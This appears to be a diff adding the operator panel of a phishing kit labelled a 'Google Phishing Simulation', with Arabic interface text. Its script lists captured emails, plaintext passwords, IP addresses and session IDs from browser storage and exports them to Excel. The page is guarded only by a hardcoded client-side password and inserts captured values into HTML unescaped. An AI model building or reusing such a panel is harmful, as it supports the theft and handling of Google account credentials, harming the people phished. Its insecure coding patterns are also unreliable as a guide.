@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Developer Admin Panel - Google Phishing Simulation</title>
+    <link rel="stylesheet" href="phishing-awareness.css">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/xlsx/dist/xlsx.full.min.js"></script>
+    <style>
+        .admin-warning {
+            background: #ffe5e5;
+            color: #c0392b;
+            border: 1px solid #e74c3c;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 24px;
+            font-size: 16px;
+            text-align: center;
+        }
+        .admin-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 24px;
+        }
+        .admin-table th, .admin-table td {
+            border: 1px solid #dadce0;
+            padding: 8px 12px;
+            text-align: left;
+            font-size: 14px;
+        }
+        .admin-table th {
+            background: #f2f2f2;
+        }
+        .admin-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-right: 8px;
+            transition: background 0.2s;
+        }
+        .admin-btn:hover {
+            background: #1557b0;
+        }
+        .admin-header {
+            margin-bottom: 32px;
+            text-align: center;
+        }
+        .admin-header h1 {
+            font-size: 2rem;
+            color: #202124;
+        }
+        .admin-header p {
+            color: #5f6368;
+            font-size: 1rem;
+        }
+        .admin-footer {
+            text-align: center;
+            color: #aaa;
+            font-size: 13px;
+            margin-top: 40px;
+        }
+    </style>
+</head>
+<body style="background: #fff;">
+    <div class="admin-header">
+        <h1>Developer Admin Panel</h1>
+        <p>Google Phishing Simulation - <strong>For Developer Use Only</strong></p>
+    </div>
+    <div class="admin-warning">
+        ⚠️ هذه الصفحة مخصصة للمبرمج فقط!<br>
+        لا تشارك هذا الرابط أو هذه الصفحة مع أي مستخدم عادي.<br>
+        جميع بيانات المستخدمين المعروضة هنا سرية للغاية.
+    </div>
+    <div style="text-align: right; margin-bottom: 16px;">
+        <button class="admin-btn" onclick="downloadExcel()">📥 تحميل ملف Excel</button>
+        <button class="admin-btn" onclick="clearAllData()">🗑️ مسح جميع البيانات</button>
+    </div>
+    <div id="tableContainer"></div>
+    <div class="admin-footer">
+        &copy; 2024 - Google Phishing Simulation | Developer Only
+    </div>
+    <script>
+    // Load captured data from localStorage
+    function getCapturedData() {
+        try {
+            const data = localStorage.getItem('phishingSimulationData');
+            return data ? JSON.parse(data) : [];
+        } catch (e) {
+            return [];
+        }
+    }
+
+    function renderTable() {
+        const data = getCapturedData();
+        const container = document.getElementById('tableContainer');
+        if (!data.length) {
+            container.innerHTML = '<div style="text-align:center;color:#888;font-size:18px;">لا توجد بيانات حتى الآن.</div>';
+            return;
+        }
+        let html = '<table class="admin-table">';
+        html += '<tr><th>#</th><th>Email</th><th>Password</th><th>Timestamp</th><th>User Agent</th><th>IP Address</th><th>Session ID</th></tr>';
+        data.forEach((row, idx) => {
+            html += `<tr>
+                <td>${idx + 1}</td>
+                <td>${row.email}</td>
+                <td>${row.password}</td>
+                <td>${new Date(row.timestamp).toLocaleString()}</td>
+                <td style="max-width:200px;overflow-x:auto;">${row.userAgent}</td>
+                <td>${row.ipAddress}</td>
+                <td>${row.sessionId}</td>
+            </tr>`;
+        });
+        html += '</table>';
+        container.innerHTML = html;
+    }
+
+    function downloadExcel() {
+        const data = getCapturedData();
+        if (!data.length) return alert('لا توجد بيانات!');
+        const workbook = XLSX.utils.book_new();
+        const worksheetData = [
+            ['Email', 'Password', 'Timestamp', 'User Agent', 'IP Address', 'Session ID'],
+            ...data.map(row => [
+                row.email,
+                row.password,
+                row.timestamp,
+                row.userAgent,
+                row.ipAddress,
+                row.sessionId
+            ])
+        ];
+        const worksheet = XLSX.utils.aoa_to_sheet(worksheetData);
+        worksheet['!cols'] = [
+            { wch: 30 }, { wch: 20 }, { wch: 25 }, { wch: 50 }, { wch: 15 }, { wch: 25 }
+        ];
+        XLSX.utils.book_append_sheet(workbook, worksheet, 'Phishing Simulation Data');
+        const excelBuffer = XLSX.write(workbook, { bookType: 'xlsx', type: 'array' });
+        const blob = new Blob([excelBuffer], { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' });
+        const url = URL.createObjectURL(blob);
+        const link = document.createElement('a');
+        link.href = url;
+        link.download = `phishing_simulation_report_${new Date().toISOString().split('T')[0]}.xlsx`;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        URL.revokeObjectURL(url);
+    }
+
+    function clearAllData() {
+        if (confirm('هل أنت متأكد أنك تريد مسح جميع البيانات؟')) {
+            localStorage.removeItem('phishingSimulationData');
+            localStorage.removeItem('phishingSimulationExcel');
+            renderTable();
+        }
+    }
+
+    // Optional: Simple password protection (for demonstration)
+    (function protectPage() {
+        const password = 'devonly2024'; // Change this password as needed
+        if (!sessionStorage.getItem('adminAuth')) {
+            let input = prompt('صفحة المطورين فقط!\nيرجى إدخال كلمة المرور:');
+            if (input !== password) {
+                document.body.innerHTML = '<div style="color:#c0392b;text-align:center;font-size:2rem;margin-top:100px;">دخول غير مصرح به!</div>';
+                throw new Error('Unauthorized');
+            } else {
+                sessionStorage.setItem('adminAuth', '1');
+            }
+        }
+    })();
+
+    renderTable();
+    </script>
+</body>
+</html>
